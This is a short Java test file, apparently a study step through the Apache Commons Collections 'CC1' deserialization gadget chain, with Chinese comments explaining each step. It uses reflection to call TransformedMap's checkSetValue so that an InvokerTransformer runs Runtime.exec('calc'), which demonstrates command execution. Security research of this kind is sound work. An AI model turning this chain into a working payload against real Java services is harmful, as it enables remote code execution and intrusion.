package com.drose.CC1;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CheckSetValueTest {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        //我们需要调用decorate方法，所有构造一个map，然后把invokerTransformer放进去
        HashMap<Object,Object> hashMap=new HashMap<>();

        //先获取尾部，也就是之前的invokerTransformer
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});

        Map invokeMap= TransformedMap.decorate(hashMap,null,invokerTransformer);

        //反射获取checkSetValue方法，把invokemap放进去，同时传入runtime类，调用其中的exec方法命令执行
        Class<TransformedMap> transformedMapClass=TransformedMap.class;
        Method checkSetValueRef =transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
        checkSetValueRef.setAccessible(true);
        Runtime runtime = Runtime.getRuntime();
        //方法、实例、参数
        checkSetValueRef.invoke(invokeMap,runtime);
    }
}
